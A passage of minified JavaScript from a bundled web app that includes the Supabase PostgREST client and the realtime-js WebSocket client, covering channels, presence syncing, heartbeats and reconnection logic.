Xr;Ug=1;var n=Xr&&Xr.__importDefault||function(a){return a&&a.__esModule?a:{default:a}};Object.defineProperty(Xr,"__esModule",{value:!0});const e=n(_b()),r=n(hd());class s{constructor(l,{headers:c={},schema:d,fetch:p}={}){this.url=l,this.headers=new Headers(c),this.schemaName=d,this.fetch=p}from(l){const c=new URL(`${this.url}/${l}`);return new e.default(c,{headers:new Headers(this.headers),schema:this.schemaName,fetch:this.fetch})}schema(l){return new s(this.url,{headers:this.headers,schema:l,fetch:this.fetch})}rpc(l,c={},{head:d=!1,get:p=!1,count:f}={}){var m;let y;const v=new URL(`${this.url}/rpc/${l}`);let w;d||p?(y=d?"HEAD":"GET",Object.entries(c).filter(([k,x])=>x!==void 0).map(([k,x])=>[k,Array.isArray(x)?`{${x.join(",")}}`:`${x}`]).forEach(([k,x])=>{v.searchParams.append(k,x)})):(y="POST",w=c);const A=new Headers(this.headers);return f&&A.set("Prefer",`count=${f}`),new r.default({method:y,url:v,headers:A,schema:this.schemaName,body:w,fetch:(m=this.fetch)!==null&&m!==void 0?m:fetch})}}return Xr.default=s,Xr}var zg;function PT(){if(zg)return tt;zg=1;var n=tt&&tt.__importDefault||function(d){return d&&d.__esModule?d:{default:d}};Object.defineProperty(tt,"__esModule",{value:!0}),tt.PostgrestError=tt.PostgrestBuilder=tt.PostgrestTransformBuilder=tt.PostgrestFilterBuilder=tt.PostgrestQueryBuilder=tt.PostgrestClient=void 0;const e=n(ET());tt.PostgrestClient=e.default;const r=n(_b());tt.PostgrestQueryBuilder=r.default;const s=n(hd());tt.PostgrestFilterBuilder=s.default;const a=n(Pb());tt.PostgrestTransformBuilder=a.default;const l=n(Eb());tt.PostgrestBuilder=l.default;const c=n(Cb());return tt.PostgrestError=c.default,tt.default={PostgrestClient:e.default,PostgrestQueryBuilder:r.default,PostgrestFilterBuilder:s.default,PostgrestTransformBuilder:a.default,PostgrestBuilder:l.default,PostgrestError:c.default},tt}var _T=PT();const IT=wa(_T),{PostgrestClient:RT,PostgrestQueryBuilder:XC,PostgrestFilterBuilder:ZC,PostgrestTransformBuilder:e3,PostgrestBuilder:t3,PostgrestError:n3}=IT;class DT{static detectEnvironment(){var e;if(typeof WebSocket<"u")return{type:"native",constructor:WebSocket};if(typeof globalThis<"u"&&typeof globalThis.WebSocket<"u")return{type:"native",constructor:globalThis.WebSocket};if(typeof global<"u"&&typeof global.WebSocket<"u")return{type:"native",constructor:global.WebSocket};if(typeof globalThis<"u"&&typeof globalThis.WebSocketPair<"u"&&typeof globalThis.WebSocket>"u")return{type:"cloudflare",error:"Cloudflare Workers detected. WebSocket clients are not supported in Cloudflare Workers.",workaround:"Use Cloudflare Workers WebSocket API for server-side WebSocket handling, or deploy to a different runtime."};if(typeof globalThis<"u"&&globalThis.EdgeRuntime||typeof navigator<"u"&&(!((e=navigator.userAgent)===null||e===void 0)&&e.includes("Vercel-Edge")))return{type:"unsupported",error:"Edge runtime detected (Vercel Edge/Netlify Edge). WebSockets are not supported in edge functions.",workaround:"Use serverless functions or a different deployment target for WebSocket functionality."};if(typeof process<"u"){const r=process.versions;if(r&&r.node){const s=r.node,a=parseInt(s.replace(/^v/,"").split(".")[0]);return a>=22?typeof globalThis.WebSocket<"u"?{type:"native",constructor:globalThis.WebSocket}:{type:"unsupported",error:`Node.js ${a} detected but native WebSocket not found.`,workaround:"Provide a WebSocket implementation via the transport option."}:{type:"unsupported",error:`Node.js ${a} detected without native WebSocket support.`,workaround:`For Node.js < 22, install "ws" package and provide it via the transport option:
import ws from "ws"
new RealtimeClient(url, { transport: ws })`}}}return{type:"unsupported",error:"Unknown JavaScript runtime without WebSocket support.",workaround:"Ensure you're running in a supported environment (browser, Node.js, Deno) or provide a custom WebSocket implementation."}}static getWebSocketConstructor(){const e=this.detectEnvironment();if(e.constructor)return e.constructor;let r=e.error||"WebSocket not supported in this environment.";throw e.workaround&&(r+=`

Suggested solution: ${e.workaround}`),new Error(r)}static createWebSocket(e,r){const s=this.getWebSocketConstructor();return new s(e,r)}static isWebSocketSupported(){try{const e=this.detectEnvironment();return e.type==="native"||e.type==="ws"}catch{return!1}}}const OT="2.74.0",jT=`realtime-js/${OT}`,MT="1.0.0",Su=1e4,BT=1e3,NT=100;var ys;(function(n){n[n.connecting=0]="connecting",n[n.open=1]="open",n[n.closing=2]="closing",n[n.closed=3]="closed"})(ys||(ys={}));var Je;(function(n){n.closed="closed",n.errored="errored",n.joined="joined",n.joining="joining",n.leaving="leaving"})(Je||(Je={}));var Gt;(function(n){n.close="phx_close",n.error="phx_error",n.join="phx_join",n.reply="phx_reply",n.leave="phx_leave",n.access_token="access_token"})(Gt||(Gt={}));var Tu;(function(n){n.websocket="websocket"})(Tu||(Tu={}));var gr;(function(n){n.Connecting="connecting",n.Open="open",n.Closing="closing",n.Closed="closed"})(gr||(gr={}));class LT{constructor(){this.HEADER_LENGTH=1}decode(e,r){return e.constructor===ArrayBuffer?r(this._binaryDecode(e)):r(typeof e=="string"?JSON.parse(e):{})}_binaryDecode(e){const r=new DataView(e),s=new TextDecoder;return this._decodeBroadcast(e,r,s)}_decodeBroadcast(e,r,s){const a=r.getUint8(1),l=r.getUint8(2);let c=this.HEADER_LENGTH+2;const d=s.decode(e.slice(c,c+a));c=c+a;const p=s.decode(e.slice(c,c+l));c=c+l;const f=JSON.parse(s.decode(e.slice(c,e.byteLength)));return{ref:null,topic:d,event:p,payload:f}}}class Ib{constructor(e,r){this.callback=e,this.timerCalc=r,this.timer=void 0,this.tries=0,this.callback=e,this.timerCalc=r}reset(){this.tries=0,clearTimeout(this.timer),this.timer=void 0}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}var _e;(function(n){n.abstime="abstime",n.bool="bool",n.date="date",n.daterange="daterange",n.float4="float4",n.float8="float8",n.int2="int2",n.int4="int4",n.int4range="int4range",n.int8="int8",n.int8range="int8range",n.json="json",n.jsonb="jsonb",n.money="money",n.numeric="numeric",n.oid="oid",n.reltime="reltime",n.text="text",n.time="time",n.timestamp="timestamp",n.timestamptz="timestamptz",n.timetz="timetz",n.tsrange="tsrange",n.tstzrange="tstzrange"})(_e||(_e={}));const Vg=(n,e,r={})=>{var s;const a=(s=r.skipTypes)!==null&&s!==void 0?s:[];return e?Object.keys(e).reduce((l,c)=>(l[c]=FT(c,n,e,a),l),{}):{}},FT=(n,e,r,s)=>{const a=e.find(d=>d.name===n),l=a?.type,c=r[n];return l&&!s.includes(l)?Rb(l,c):Au(c)},Rb=(n,e)=>{if(n.charAt(0)==="_"){const r=n.slice(1,n.length);return WT(e,r)}switch(n){case _e.bool:return UT(e);case _e.float4:case _e.float8:case _e.int2:case _e.int4:case _e.int8:case _e.numeric:case _e.oid:return zT(e);case _e.json:case _e.jsonb:return VT(e);case _e.timestamp:return $T(e);case _e.abstime:case _e.date:case _e.daterange:case _e.int4range:case _e.int8range:case _e.money:case _e.reltime:case _e.text:case _e.time:case _e.timestamptz:case _e.timetz:case _e.tsrange:case _e.tstzrange:return Au(e);default:return Au(e)}},Au=n=>n,UT=n=>{switch(n){case"t":return!0;case"f":return!1;default:return n}},zT=n=>{if(typeof n=="string"){const e=parseFloat(n);if(!Number.isNaN(e))return e}return n},VT=n=>{if(typeof n=="string")try{return JSON.parse(n)}catch(e){return console.log(`JSON parse error: ${e}`),n}return n},WT=(n,e)=>{if(typeof n!="string")return n;const r=n.length-1,s=n[r];if(n[0]==="{"&&s==="}"){let l;const c=n.slice(1,r);try{l=JSON.parse("["+c+"]")}catch{l=c?c.split(","):[]}return l.map(d=>Rb(e,d))}return n},$T=n=>typeof n=="string"?n.replace(" ","T"):n,Db=n=>{let e=n;return e=e.replace(/^ws/i,"http"),e=e.replace(/(\/socket\/websocket|\/socket|\/websocket)\/?$/i,""),e.replace(/\/+$/,"")+"/api/broadcast"};class Kc{constructor(e,r,s={},a=Su){this.channel=e,this.event=r,this.payload=s,this.timeout=a,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(e){this.timeout=e,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(e){this.payload=Object.assign(Object.assign({},this.payload),e)}receive(e,r){var s;return this._hasReceived(e)&&r((s=this.receivedResp)===null||s===void 0?void 0:s.response),this.recHooks.push({status:e,callback:r}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);const e=r=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=r,this._matchReceive(r)};this.channel._on(this.refEvent,{},e),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(e,r){this.refEvent&&this.channel._trigger(this.refEvent,{status:e,response:r})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 0}_matchReceive({status:e,response:r}){this.recHooks.filter(s=>s.status===e).forEach(s=>s.callback(r))}_hasReceived(e){return this.receivedResp&&this.receivedResp.status===e}}var Wg;(function(n){n.SYNC="sync",n.JOIN="join",n.LEAVE="leave"})(Wg||(Wg={}));class bs{constructor(e,r){this.channel=e,this.state={},this.pendingDiffs=[],this.joinRef=null,this.enabled=!1,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const s=r?.events||{state:"presence_state",diff:"presence_diff"};this.channel._on(s.state,{},a=>{const{onJoin:l,onLeave:c,onSync:d}=this.caller;this.joinRef=this.channel._joinRef(),this.state=bs.syncState(this.state,a,l,c),this.pendingDiffs.forEach(p=>{this.state=bs.syncDiff(this.state,p,l,c)}),this.pendingDiffs=[],d()}),this.channel._on(s.diff,{},a=>{const{onJoin:l,onLeave:c,onSync:d}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(a):(this.state=bs.syncDiff(this.state,a,l,c),d())}),this.onJoin((a,l,c)=>{this.channel._trigger("presence",{event:"join",key:a,currentPresences:l,newPresences:c})}),this.onLeave((a,l,c)=>{this.channel._trigger("presence",{event:"leave",key:a,currentPresences:l,leftPresences:c})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(e,r,s,a){const l=this.cloneDeep(e),c=this.transformState(r),d={},p={};return this.map(l,(f,m)=>{c[f]||(p[f]=m)}),this.map(c,(f,m)=>{const y=l[f];if(y){const v=m.map(x=>x.presence_ref),w=y.map(x=>x.presence_ref),A=m.filter(x=>w.indexOf(x.presence_ref)<0),k=y.filter(x=>v.indexOf(x.presence_ref)<0);A.length>0&&(d[f]=A),k.length>0&&(p[f]=k)}else d[f]=m}),this.syncDiff(l,{joins:d,leaves:p},s,a)}static syncDiff(e,r,s,a){const{joins:l,leaves:c}={joins:this.transformState(r.joins),leaves:this.transformState(r.leaves)};return s||(s=()=>{}),a||(a=()=>{}),this.map(l,(d,p)=>{var f;const m=(f=e[d])!==null&&f!==void 0?f:[];if(e[d]=this.cloneDeep(p),m.length>0){const y=e[d].map(w=>w.presence_ref),v=m.filter(w=>y.indexOf(w.presence_ref)<0);e[d].unshift(...v)}s(d,m,p)}),this.map(c,(d,p)=>{let f=e[d];if(!f)return;const m=p.map(y=>y.presence_ref);f=f.filter(y=>m.indexOf(y.presence_ref)<0),e[d]=f,a(d,f,p),f.length===0&&delete e[d]}),e}static map(e,r){return Object.getOwnPropertyNames(e).map(s=>r(s,e[s]))}static transformState(e){return e=this.cloneDeep(e),Object.getOwnPropertyNames(e).reduce((r,s)=>{const a=e[s];return"metas"in a?r[s]=a.metas.map(l=>(l.presence_ref=l.phx_ref,delete l.phx_ref,delete l.phx_ref_prev,l)):r[s]=a,r},{})}static cloneDeep(e){return JSON.parse(JSON.stringify(e))}onJoin(e){this.caller.onJoin=e}onLeave(e){this.caller.onLeave=e}onSync(e){this.caller.onSync=e}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}var $g;(function(n){n.ALL="*",n.INSERT="INSERT",n.UPDATE="UPDATE",n.DELETE="DELETE"})($g||($g={}));var vs;(function(n){n.BROADCAST="broadcast",n.PRESENCE="presence",n.POSTGRES_CHANGES="postgres_changes",n.SYSTEM="system"})(vs||(vs={}));var hn;(function(n){n.SUBSCRIBED="SUBSCRIBED",n.TIMED_OUT="TIMED_OUT",n.CLOSED="CLOSED",n.CHANNEL_ERROR="CHANNEL_ERROR"})(hn||(hn={}));class pd{constructor(e,r={config:{}},s){var a,l;if(this.topic=e,this.params=r,this.socket=s,this.bindings={},this.state=Je.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=e.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:"",enabled:!1},private:!1},r.config),this.timeout=this.socket.timeout,this.joinPush=new Kc(this,Gt.join,this.params,this.timeout),this.rejoinTimer=new Ib(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=Je.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(c=>c.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel",`close ${this.topic} ${this._joinRef()}`),this.state=Je.closed,this.socket._remove(this)}),this._onError(c=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,c),this.state=Je.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel",`timeout ${this.topic}`,this.joinPush.timeout),this.state=Je.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("error",c=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,c),this.state=Je.errored,this.rejoinTimer.scheduleTimeout())}),this._on(Gt.reply,{},(c,d)=>{this._trigger(this._replyEventName(d),c)}),this.presence=new bs(this),this.broadcastEndpointURL=Db(this.socket.endPoint),this.private=this.params.config.private||!1,!this.private&&(!((l=(a=this.params.config)===null||a===void 0?void 0:a.broadcast)===null||l===void 0)&&l.replay))throw`tried to use replay on public channel '${this.topic}'. It must be a private channel.`}subscribe(e,r=this.timeout){var s,a,l;if(this.socket.isConnected()||this.socket.connect(),this.state==Je.closed){const{config:{broadcast:c,presence:d,private:p}}=this.params,f=(a=(s=this.bindings.postgres_changes)===null||s===void 0?void 0:s.map(w=>w.filter))!==null&&a!==void 0?a:[],m=!!this.bindings[vs.PRESENCE]&&this.bindings[vs.PRESENCE].length>0||((l=this.params.config.presence)===null||l===void 0?void 0:l.enabled)===!0,y={},v={broadcast:c,presence:Object.assign(Object.assign({},d),{enabled:m}),postgres_changes:f,private:p};this.socket.accessTokenValue&&(y.access_token=this.socket.accessTokenValue),this._onError(w=>e?.(hn.CHANNEL_ERROR,w)),this._onClose(()=>e?.(hn.CLOSED)),this.updateJoinPayload(Object.assign({config:v},y)),this.joinedOnce=!0,this._rejoin(r),this.joinPush.receive("ok",async({postgres_changes:w})=>{var A;if(this.socket.setAuth(),w===void 0){e?.(hn.SUBSCRIBED);return}else{const k=this.bindings.postgres_changes,x=(A=k?.length)!==null&&A!==void 0?A:0,B=[];for(let _=0;_<x;_++){const P=k[_],{filter:{event:M,schema:V,table:U,filter:W}}=P,G=w&&w[_];if(G&&G.event===M&&G.schema===V&&G.table===U&&G.filter===W)B.push(Object.assign(Object.assign({},P),{id:G.id}));else{this.unsubscribe(),this.state=Je.errored,e?.(hn.CHANNEL_ERROR,new Error("mismatch between server and client bindings for postgres changes"));return}}this.bindings.postgres_changes=B,e&&e(hn.SUBSCRIBED);return}}).receive("error",w=>{this.state=Je.errored,e?.(hn.CHANNEL_ERROR,new Error(JSON.stringify(Object.values(w).join(", ")||"error")))}).receive("timeout",()=>{e?.(hn.TIMED_OUT)})}return this}presenceState(){return this.presence.state}async track(e,r={}){return await this.send({type:"presence",event:"track",payload:e},r.timeout||this.timeout)}async untrack(e={}){return await this.send({type:"presence",event:"untrack"},e)}on(e,r,s){return this.state===Je.joined&&e===vs.PRESENCE&&(this.socket.log("channel",`resubscribe to ${this.topic} due to change in presence callbacks on joined channel`),this.unsubscribe().then(()=>this.subscribe())),this._on(e,r,s)}async send(e,r={}){var s,a;if(!this._canPush()&&e.type==="broadcast"){const{event:l,payload:c}=e,p={method:"POST",headers:{Authorization:this.socket.accessTokenValue?`Bearer ${this.socket.accessTokenValue}`:"",apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"},body:JSON.stringify({messages:[{topic:this.subTopic,event:l,payload:c,private:this.private}]})};try{const f=await this._fetchWithTimeout(this.broadcastEndpointURL,p,(s=r.timeout)!==null&&s!==void 0?s:this.timeout);return await((a=f.body)===null||a===void 0?void 0:a.cancel()),f.ok?"ok":"error"}catch(f){return f.name==="AbortError"?"timed out":"error"}}else return new Promise(l=>{var c,d,p;const f=this._push(e.type,e,r.timeout||this.timeout);e.type==="broadcast"&&!(!((p=(d=(c=this.params)===null||c===void 0?void 0:c.config)===null||d===void 0?void 0:d.broadcast)===null||p===void 0)&&p.ack)&&l("ok"),f.receive("ok",()=>l("ok")),f.receive("error",()=>l("error")),f.receive("timeout",()=>l("timed out"))})}updateJoinPayload(e){this.joinPush.updatePayload(e)}unsubscribe(e=this.timeout){this.state=Je.leaving;const r=()=>{this.socket.log("channel",`leave ${this.topic}`),this._trigger(Gt.close,"leave",this._joinRef())};this.joinPush.destroy();let s=null;return new Promise(a=>{s=new Kc(this,Gt.leave,{},e),s.receive("ok",()=>{r(),a("ok")}).receive("timeout",()=>{r(),a("timed out")}).receive("error",()=>{a("error")}),s.send(),this._canPush()||s.trigger("ok",{})}).finally(()=>{s?.destroy()})}teardown(){this.pushBuffer.forEach(e=>e.destroy()),this.pushBuffer=[],this.rejoinTimer.reset(),this.joinPush.destroy(),this.state=Je.closed,this.bindings={}}async _fetchWithTimeout(e,r,s){const a=new AbortController,l=setTimeout(()=>a.abort(),s),c=await this.socket.fetch(e,Object.assign(Object.assign({},r),{signal:a.signal}));return clearTimeout(l),c}_push(e,r,s=this.timeout){if(!this.joinedOnce)throw`tried to push '${e}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;let a=new Kc(this,e,r,s);return this._canPush()?a.send():this._addToPushBuffer(a),a}_addToPushBuffer(e){if(e.startTimeout(),this.pushBuffer.push(e),this.pushBuffer.length>NT){const r=this.pushBuffer.shift();r&&(r.destroy(),this.socket.log("channel",`discarded push due to buffer overflow: ${r.event}`,r.payload))}}_onMessage(e,r,s){return r}_isMember(e){return this.topic===e}_joinRef(){return this.joinPush.ref}_trigger(e,r,s){var a,l;const c=e.toLocaleLowerCase(),{close:d,error:p,leave:f,join:m}=Gt;if(s&&[d,p,f,m].indexOf(c)>=0&&s!==this._joinRef())return;let v=this._onMessage(c,r,s);if(r&&!v)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(c)?(a=this.bindings.postgres_changes)===null||a===void 0||a.filter(w=>{var A,k,x;return((A=w.filter)===null||A===void 0?void 0:A.event)==="*"||((x=(k=w.filter)===null||k===void 0?void 0:k.event)===null||x===void 0?void 0:x.toLocaleLowerCase())===c}).map(w=>w.callback(v,s)):(l=this.bindings[c])===null||l===void 0||l.filter(w=>{var A,k,x,B,_,P;if(["broadcast","presence","postgres_changes"].includes(c))if("id"in w){const M=w.id,V=(A=w.filter)===null||A===void 0?void 0:A.event;return M&&((k=r.ids)===null||k===void 0?void 0:k.includes(M))&&(V==="*"||V?.toLocaleLowerCase()===((x=r.data)===null||x===void 0?void 0:x.type.toLocaleLowerCase()))}else{const M=(_=(B=w?.filter)===null||B===void 0?void 0:B.event)===null||_===void 0?void 0:_.toLocaleLowerCase();return M==="*"||M===((P=r?.event)===null||P===void 0?void 0:P.toLocaleLowerCase())}else return w.type.toLocaleLowerCase()===c}).map(w=>{if(typeof v=="object"&&"ids"in v){const A=v.data,{schema:k,table:x,commit_timestamp:B,type:_,errors:P}=A;v=Object.assign(Object.assign({},{schema:k,table:x,commit_timestamp:B,eventType:_,new:{},old:{},errors:P}),this._getPayloadRecords(A))}w.callback(v,s)})}_isClosed(){return this.state===Je.closed}_isJoined(){return this.state===Je.joined}_isJoining(){return this.state===Je.joining}_isLeaving(){return this.state===Je.leaving}_replyEventName(e){return`chan_reply_${e}`}_on(e,r,s){const a=e.toLocaleLowerCase(),l={type:a,filter:r,callback:s};return this.bindings[a]?this.bindings[a].push(l):this.bindings[a]=[l],this}_off(e,r){const s=e.toLocaleLowerCase();return this.bindings[s]&&(this.bindings[s]=this.bindings[s].filter(a=>{var l;return!(((l=a.type)===null||l===void 0?void 0:l.toLocaleLowerCase())===s&&pd.isEqual(a.filter,r))})),this}static isEqual(e,r){if(Object.keys(e).length!==Object.keys(r).length)return!1;for(const s in e)if(e[s]!==r[s])return!1;return!0}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(e){this._on(Gt.close,{},e)}_onError(e){this._on(Gt.error,{},r=>e(r))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(e=this.timeout){this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=Je.joining,this.joinPush.resend(e))}_getPayloadRecords(e){const r={new:{},old:{}};return(e.type==="INSERT"||e.type==="UPDATE")&&(r.new=Vg(e.columns,e.record)),(e.type==="UPDATE"||e.type==="DELETE")&&(r.old=Vg(e.columns,e.old_record)),r}}const Jc=()=>{},Xo={HEARTBEAT_INTERVAL:25e3,RECONNECT_DELAY:10,HEARTBEAT_TIMEOUT_FALLBACK:100},HT=[1e3,2e3,5e3,1e4],qT=1e4,GT=`
  addEventListener("message", (e) => {
    if (e.data.event === "start") {
      setInterval(() => postMessage({ event: "keepAlive" }), e.data.interval);
    }
  });`;class KT{constructor(e,r){var s;if(this.accessTokenValue=null,this.apiKey=null,this.channels=new Array,this.endPoint="",this.httpEndpoint="",this.headers={},this.params={},this.timeout=Su,this.transport=null,this.heartbeatIntervalMs=Xo.HEARTBEAT_INTERVAL,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.heartbeatCallback=Jc,this.ref=0,this.reconnectTimer=null,this.logger=Jc,this.conn=null,this.sendBuffer=[],this.serializer=new LT,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this.accessToken=null,this._connectionState="disconnected",this._wasManualDisconnect=!1,this._authPromise=null,this._resolveFetch=a=>{let l;return a?l=a:typeof fetch>"u"?l=(...c)=>Rs(async()=>{const{default:d}=await Promise.resolve().then(()=>vi);return{default:d}},void 0).then(({default:d})=>d(...c)).catch(d=>{throw new Error(`Failed to load @supabase/node-fetch: ${d.message}. This is required for HTTP requests in Node.js environments without native fetch.`)}):l=fetch,(...c)=>l(...c)},!(!((s=r?.params)===null||s===void 0)&&s.apikey))throw new Error("API key is required to connect to Realtime");this.apiKey=r.params.apikey,this.endPoint=`${e}/${Tu.websocket}`,this.httpEndpoint=Db(e),this._initializeOptions(r),this._setupReconnectionTimer(),this.fetch=this._resolveFetch(r?.fetch)}connect(){if(!(this.isConnecting()||this.isDisconnecting()||this.conn!==null&&this.isConnected())){if(this._setConnectionState("connecting"),this._setAuthSafely("connect"),this.transport)this.conn=new this.transport(this.endpointURL());else try{this.conn=DT.createWebSocket(this.endpointURL())}catch(e){this._setConnectionState("disconnected");const r=e.message;throw r.includes("Node.js")?new Error(`${r}

To use Realtime in Node.js, you need to provide a WebSocket implementation:

Option 1: Use Node.js 22+ which has native WebSocket support
Option 2: Install and provide the "ws" package:

  npm install ws

  import ws from "ws"
  const client = new RealtimeClient(url, {
    ...options,
    transport: ws
  })`):new Error(`WebSocket not available: ${r}`)}this._setupConnectionHandlers()}}endpointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:MT}))}disconnect(e,r){if(!this.isDisconnecting())if(this._setConnectionState("disconnecting",!0),this.conn){const s=setTimeout(()=>{this._setConnectionState("disconnected")},100);this.conn.onclose=()=>{clearTimeout(s),this._setConnectionState("disconnected")},e?this.conn.close(e,r??""):this.conn.close(),this._teardownConnection()}else this._setConnectionState("disconnected")}getChannels(){return this.channels}async removeChannel(e){const r=await e.unsubscribe();return this.channels.length===0&&this.disconnect(),r}async removeAllChannels(){const e=await Promise.all(this.channels.map(r=>r.unsubscribe()));return this.channels=[],this.disconnect(),e}log(e,r,s){this.logger(e,r,s)}connectionState(){switch(this.conn&&this.conn.readyState){case ys.connecting:return gr.Connecting;case ys.open:return gr.Open;case ys.closing:return gr.Closing;default:return gr.Closed}}isConnected(){return this.connectionState()===gr.Open}isConnecting(){return this._connectionState==="connecting"}isDisconnecting(){return this._connectionState==="disconnecting"}channel(e,r={config:{}}){const s=`realtime:${e}`,a=this.getChannels().find(l=>l.topic===s);if(a)return a;{const l=new pd(`realtime:${e}`,r,this);return this.channels.push(l),l}}push(e){const{topic:r,event:s,payload:a,ref:l}=e,c=()=>{this.encode(e,d=>{var p;(p=this.conn)===null||p===void 0||p.send(d)})};this.log("push",`${r} ${s} (${l})`,a),this.isConnected()?c():this.sendBuffer.push(c)}async setAuth(e=null){this._authPromise=this._performAuth(e);try{await this._authPromise}finally{this._authPromise=null}}async sendHeartbeat(){var e;if(!this.isConnected()){try{this.heartbeatCallback("disconnected")}catch(r){this.log("error","error in heartbeat callback",r)}return}if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection");try{this.heartbeatCallback("timeout")}catch(r){this.log("error","error in heartbeat callback",r)}this._wasManualDisconnect=!1,(e=this.conn)===null||e===void 0||e.close(BT,"heartbeat timeout"),setTimeout(()=>{var r;this.isConnected()||(r=this.reconnectTimer)===null||r===void 0||r.scheduleTimeout()},Xo.HEARTBEAT_TIMEOUT_FALLBACK);return}this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef});try{this.heartbeatCallback("sent")}catch(r){this.log("error","error in heartbeat callback",r)}this._setAuthSafely("heartbeat")}onHeartbeat(e){this.heartbeatCallback=e}flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(e=>e()),this.sendBuffer=[])}_makeRef(){let e=this.ref+1;return e===this.ref?this.ref=0:this.ref=e,this.ref.toString()}_leaveOpenTopic(e){let r=this.channels.find(s=>s.topic===e&&(s._isJoined()||s._isJoining()));r&&(this.log("transport",`leaving duplicate topic "${e}"`),r.unsubscribe())}_remove(e){this.channels=this.channels.filter(r=>r.topic!==e.topic)}_onConnMessage(e){this.decode(e.data,r=>{if(r.topic==="phoenix"&&r.event==="phx_reply")try{this.heartbeatCallback(r.payload.status==="ok"?"ok":"error")}catch(f){this.log("error","error in heartbeat callback",f)}r.ref&&r.ref===this.pendingHeartbeatRef&&(this.pendingHeartbeatRef=null);const{topic:s,event:a,payload:l,ref:c}=r,d=c?`(${c})`:"",p=l.status||"";this.log("receive",`${p} ${s} ${a} ${d}`.trim(),l),this.channels.filter(f=>f._isMember(s)).forEach(f=>f._trigger(a,l,c)),this._triggerStateCallbacks("message",r)})}_clearTimer(e){var r;e==="heartbeat"&&this.heartbeatTimer?(clearInterval(this.heartbeatTimer),this.heartbeatTimer=void 0):e==="reconnect"&&((r=this.reconnectTimer)===null||r===void 0||r.reset())}_clearAllTimers(){this._clearTimer("heartbeat"),this._clearTimer("reconnect")}_setupConnectionHandlers(){this.conn&&("binaryType"in this.conn&&(this.conn.binaryType="arraybuffer"),this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=e=>this._onConnError(e),this.conn.onmessage=e=>this._onConnMessage(e),this.conn.onclose=e=>this._onConnClose(e))}_teardownConnection(){this.conn&&(this.conn.onopen=null,this.conn.onerror=null,this.conn.onmessage=null,this.conn.onclose=null,this.conn=null),this._clearAllTimers(),this.channels.forEach(e=>e.teardown())}_onConnOpen(){this._setConnectionState("connected"),this.log("transport",`connected to ${this.endpointURL()}`),this.flushSendBuffer(),this._clearTimer("reconnect"),this.worker?this.workerRef||this._startWorkerHeartbeat():this._startHeartbeat(),this._triggerStateCallbacks("open")}_startHeartbeat(){this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this.sendHeartbeat(),this.heartbeatIntervalMs)}_startWorkerHeartbeat(){this.workerUrl?this.log("worker",`starting worker for from ${this.workerUrl}`):this.log("worker","starting default worker");const e=this._workerObjectUrl(this.workerUrl);this.workerRef=new Worker(e),this.workerRef.onerror=r=>{this.log("worker","worker error",r.message),this.workerRef.terminate()},this.workerRef.onmessage=r=>{r.data.event==="keepAlive"&&this.sendHeartbeat()},this.workerRef.postMessage({event:"start",interval:this.heartbeatIntervalMs})}_onConnClose(e){var r;this._setConnectionState("disconnected"),this.log("transport","close",e),this._triggerChanError(),this._clearTimer("heartbeat"),this._wasManualDisconnect||(r=this.reconnectTimer)===null||r===void 0||r.scheduleTimeout(),this._triggerStateCallbacks("close",e)}_onConnError(e){this._setConnectionState("disconnected"),this.log("transport",`${e}`),this._triggerChanError(),this._triggerStateCallbacks("error",e)}_triggerChanError(){this.channels.forEach(e=>e._trigger(Gt.error))}_appendParams(e,r){if(Object.keys(r).length===0)return e;const s=e.match(/\?/)?"&":"?",a=new URLSearchParams(r);return`${e}${s}${a}`}_workerObjectUrl(e){let r;if(e)r=e;else{const s=new 